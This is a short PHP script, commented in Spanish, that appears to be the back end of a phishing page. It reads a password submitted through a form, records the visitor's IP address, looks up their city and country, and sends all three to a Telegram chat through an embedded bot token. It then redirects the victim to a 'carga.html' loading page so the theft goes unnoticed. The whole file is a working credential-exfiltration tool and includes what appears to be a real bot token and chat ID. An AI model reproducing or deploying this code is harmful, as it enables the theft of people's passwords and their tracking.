<?php
// Configuración de Telegram
$telegramToken = "8198531920:AAEvRL0O26Hs5cdjTRsImltuxQGMlIKqCHk";
$chatId = "-4695344087";

// Obtener la contraseña del formulario
$password = htmlspecialchars($_POST['password']);

// Obtener la IP del usuario
$ip = $_SERVER['REMOTE_ADDR'];

// Obtener la ubicación aproximada basada en la IP
$locationData = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
$city = $locationData['city'] ?? 'Desconocido';
$country = $locationData['country'] ?? 'Desconocido';

// Crear el mensaje para Telegram
$message = "🔐 *Nuevo acceso recibido*\n\n";
$message .= "📂 *Contraseña:* $password\n";
$message .= "🌍 *Ubicación:* $city, $country\n";
$message .= "📡 *IP:* $ip\n";

// Enviar el mensaje a Telegram
$telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Realizar la solicitud
$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
    ],
];
$context = stream_context_create($options);
$response = file_get_contents($telegramUrl, false, $context);

// Redirigir al usuario a una página de confirmación (opcional)
header("Location: carga.html");
exit;
?>